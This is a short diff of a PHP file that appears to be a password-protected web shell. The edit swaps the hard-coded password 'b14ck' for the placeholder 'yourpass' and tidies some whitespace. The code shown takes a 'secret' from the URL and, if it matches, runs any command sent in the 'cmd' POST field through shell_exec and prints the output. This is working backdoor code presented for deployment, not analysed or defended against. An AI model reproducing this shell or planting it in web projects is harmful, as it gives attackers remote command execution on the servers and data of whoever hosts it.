@@ -29,11 +29,11 @@
  */
 
 // Insert here your harcoded pass
-$auth = "b14ck";                
+$auth = "yourpass";                
 
 $secret = isset($_GET['secret']) ? $_GET['secret'] : ''; 
 
-if ($secret === '' || $secret === false || $secret === null ) {
+if ($secret === '' || $secret === false || $secret === null) {
     die('Bad Secret!!!');
 } elseif ($secret != $auth) {
     die('Bad Auth!!!');
@@ -42,7 +42,7 @@ if ($secret === '' || $secret === false || $secret === null ) {
 $basename = basename(__FILE__);
 $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
 
-if ($cmd === '' || $cmd === false || $cmd === null ) {
+if ($cmd === '' || $cmd === false || $cmd === null) {
     $result = "No cmd".PHP_EOL;
 } else {
     $result = htmlentities(utf8_decode(shell_exec($cmd)), ENT_SUBSTITUTE);
